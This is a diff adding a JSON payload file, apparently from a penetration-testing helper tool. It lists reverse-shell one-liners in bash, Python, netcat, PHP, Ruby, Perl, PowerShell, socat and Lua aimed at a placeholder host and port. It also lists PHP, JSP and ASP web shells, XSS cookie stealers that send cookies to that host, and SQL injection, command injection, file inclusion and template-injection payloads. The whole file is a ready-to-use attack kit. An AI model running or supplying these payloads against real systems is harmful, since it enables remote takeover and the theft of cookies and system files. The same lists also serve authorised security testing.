@@ -1,0 +1,230 @@
+{
+    "reverse_shells": [
+        {
+            "name": "Bash -i",
+            "cmd": "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"
+        },
+        {
+            "name": "Bash read",
+            "cmd": "bash -c 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'"
+        },
+        {
+            "name": "Python3",
+            "cmd": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+        },
+        {
+            "name": "Python2",
+            "cmd": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+        },
+        {
+            "name": "Netcat mkfifo",
+            "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"
+        },
+        {
+            "name": "Netcat -e",
+            "cmd": "nc -e /bin/sh {IP} {PORT}"
+        },
+        {
+            "name": "Netcat -c",
+            "cmd": "nc -c /bin/sh {IP} {PORT}"
+        },
+        {
+            "name": "PHP exec",
+            "cmd": "php -r '$sock=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        },
+        {
+            "name": "PHP proc_open",
+            "cmd": "php -r '$sock=fsockopen(\"{IP}\",{PORT});$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'"
+        },
+        {
+            "name": "Ruby",
+            "cmd": "ruby -rsocket -e'f=TCPSocket.open(\"{IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+        },
+        {
+            "name": "Perl",
+            "cmd": "perl -e 'use Socket;$i=\"{IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")};'"
+        },
+        {
+            "name": "PowerShell",
+            "cmd": "powershell -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$o=(iex $d 2>&1|Out-String);$r=$o+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\""
+        },
+        {
+            "name": "xterm",
+            "cmd": "xterm -display {IP}:1"
+        },
+        {
+            "name": "Socat",
+            "cmd": "socat TCP:{IP}:{PORT} EXEC:/bin/sh"
+        },
+        {
+            "name": "Lua",
+            "cmd": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{IP}','{PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
+        }
+    ],
+    "quick_payloads": {
+        "Web Shells": [
+            {
+                "name": "PHP system",
+                "code": "<?php system($_REQUEST[0]); ?>"
+            },
+            {
+                "name": "PHP exec",
+                "code": "<?php echo shell_exec($_GET['cmd']); ?>"
+            },
+            {
+                "name": "PHP passthru",
+                "code": "<?php passthru($_GET['cmd']); ?>"
+            },
+            {
+                "name": "PHP full",
+                "code": "<?php if(isset($_REQUEST['cmd'])){echo '<pre>'.shell_exec($_REQUEST['cmd']).'</pre>';} ?>"
+            },
+            {
+                "name": "JSP",
+                "code": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
+            },
+            {
+                "name": "ASP",
+                "code": "<% eval request(\"cmd\") %>"
+            }
+        ],
+        "XSS": [
+            {
+                "name": "Alert",
+                "code": "<script>alert(1)</script>"
+            },
+            {
+                "name": "IMG onerror",
+                "code": "<img src=x onerror=alert(1)>"
+            },
+            {
+                "name": "SVG onload",
+                "code": "<svg onload=alert(1)>"
+            },
+            {
+                "name": "Cookie Stealer",
+                "code": "<script>document.location='http://{IP}/?c='+document.cookie</script>"
+            },
+            {
+                "name": "Cookie Fetch",
+                "code": "<script>fetch('http://{IP}/?c='+document.cookie)</script>"
+            },
+            {
+                "name": "Event handler",
+                "code": "\" onfocus=alert(1) autofocus=\""
+            },
+            {
+                "name": "Iframe",
+                "code": "<iframe src=\"javascript:alert(1)\">"
+            }
+        ],
+        "SQLi": [
+            {
+                "name": "Auth Bypass",
+                "code": "' OR 1=1 --"
+            },
+            {
+                "name": "Auth Bypass 2",
+                "code": "' OR '1'='1"
+            },
+            {
+                "name": "Union SELECT",
+                "code": "' UNION SELECT NULL,NULL,NULL --"
+            },
+            {
+                "name": "Union columns",
+                "code": "' ORDER BY 1 --"
+            },
+            {
+                "name": "Error Based",
+                "code": "' AND 1=CONVERT(int,(SELECT @@version)) --"
+            },
+            {
+                "name": "Time Based",
+                "code": "' AND SLEEP(5) --"
+            },
+            {
+                "name": "Stacked",
+                "code": "'; EXEC xp_cmdshell('whoami') --"
+            }
+        ],
+        "Command Injection": [
+            {
+                "name": "Semicolon",
+                "code": "; cat /etc/passwd"
+            },
+            {
+                "name": "Pipe",
+                "code": "| cat /etc/passwd"
+            },
+            {
+                "name": "AND",
+                "code": "&& cat /etc/passwd"
+            },
+            {
+                "name": "Backtick",
+                "code": "`cat /etc/passwd`"
+            },
+            {
+                "name": "Dollar",
+                "code": "$(cat /etc/passwd)"
+            },
+            {
+                "name": "Newline",
+                "code": "%0a cat /etc/passwd"
+            }
+        ],
+        "File Inclusion": [
+            {
+                "name": "LFI /etc/passwd",
+                "code": "../../../../etc/passwd"
+            },
+            {
+                "name": "LFI Null Byte",
+                "code": "../../../../etc/passwd%00"
+            },
+            {
+                "name": "LFI filter b64",
+                "code": "php://filter/convert.base64-encode/resource=index.php"
+            },
+            {
+                "name": "RFI",
+                "code": "http://{IP}/shell.txt"
+            },
+            {
+                "name": "PHP input",
+                "code": "php://input"
+            },
+            {
+                "name": "Data wrapper",
+                "code": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+            },
+            {
+                "name": "Log Poison",
+                "code": "/var/log/apache2/access.log"
+            }
+        ],
+        "SSTI": [
+            {
+                "name": "Jinja2 detect",
+                "code": "{{7*7}}"
+            },
+            {
+                "name": "Jinja2 RCE",
+                "code": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+            },
+            {
+                "name": "Twig detect",
+                "code": "{{7*7}}"
+            },
+            {
+                "name": "ERB detect",
+                "code": "<%= 7*7 %>"
+            },
+            {
+                "name": "Mako",
+                "code": "${7*7}"
+            }
+        ]
+    }
+}
